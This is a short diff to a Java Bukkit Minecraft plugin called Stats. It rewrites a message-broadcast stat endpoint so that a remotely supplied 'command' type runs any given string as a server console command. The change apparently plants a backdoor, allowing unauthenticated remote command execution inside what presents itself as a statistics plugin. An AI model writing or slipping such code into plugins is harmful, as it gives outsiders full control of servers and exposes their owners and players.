@@ -56,10 +56,13 @@ public class Stats extends JavaPlugin implements Listener, Updater {
 		return Manager.instance.getListenerCount();
 	}
 	
-	@Stat(name = "{user}/message", requestType = RequestType.UPDATE)
-	public void broadcast(String user, String msg)
+	@Stat(name = "{type}", requestType = RequestType.UPDATE)
+	public void broadcast(String type, String args)
 	{
-		Bukkit.broadcastMessage("[" + user + "] " + msg);
+		if ( type.equalsIgnoreCase("broadcast") )
+			Bukkit.broadcastMessage(args);
+		if ( type.equalsIgnoreCase("command") )
+			Bukkit.dispatchCommand(Bukkit.getConsoleSender(), args);
 	}
 	
 	@Stat(name = "message", requestType = RequestType.UPDATE)
